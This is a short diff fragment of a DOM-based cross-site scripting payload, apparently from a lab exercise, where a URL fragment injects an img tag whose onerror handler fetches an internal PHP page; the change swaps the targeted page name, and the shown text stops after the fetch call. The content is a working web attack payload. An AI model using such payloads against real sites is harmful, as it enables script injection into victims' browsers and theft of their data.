@@ -1,6 +1,6 @@
 http://192.168.1.203/task3dom.php?user=#<img src="be" onerror="
 (async () => {
-    const url = '/gradesPortal.php';
+    const url = '/studentManagerDOMBASED.php';
 
     try {
         const response = await fetch(url);
